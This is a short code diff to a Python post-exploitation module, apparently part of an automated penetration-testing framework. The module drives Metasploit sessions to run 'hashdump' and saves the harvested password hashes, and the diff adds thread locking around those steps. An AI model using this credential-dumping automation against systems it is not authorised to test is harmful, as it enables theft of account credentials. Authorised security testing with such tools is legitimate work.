@@ -40,11 +40,13 @@ class post_msf_dumphashes(actionModule):
                         if not self.seentarget(s):
                             # add the new IP to the already seen list
                             self.addseentarget(s)
+                            myMsf.lock.acquire()
                             msf.execute("sessions -i " + str(s) + "\n")
                             msf.sleep(int(self.config['msfexploitdelay']))
                             msf.execute("hashdump\n")
                             msf.sleep(int(self.config['msfexploitdelay']))
                             msf.execute("background\n")
+                            msf.sleep(int(self.config['msfexploitdelay']))
 
                             # TODO - process results and store results in KB
                             # regex match on [^:]+:[^:]+:[^:]+:[^:]+:::
@@ -52,6 +54,7 @@ class post_msf_dumphashes(actionModule):
                                           "proofsDir"] + self.shortName + "_HashDump_" + t + "_" + Utils.getRandStr(
                                 10)
                             text = msf.getResult()
+                            myMsf.lock.release()
                             Utils.writeFile(text, outfile)
                             kb.add("host/" + t + "/files/" + self.shortName + "/" + outfile.replace("/", "%2F"))
 
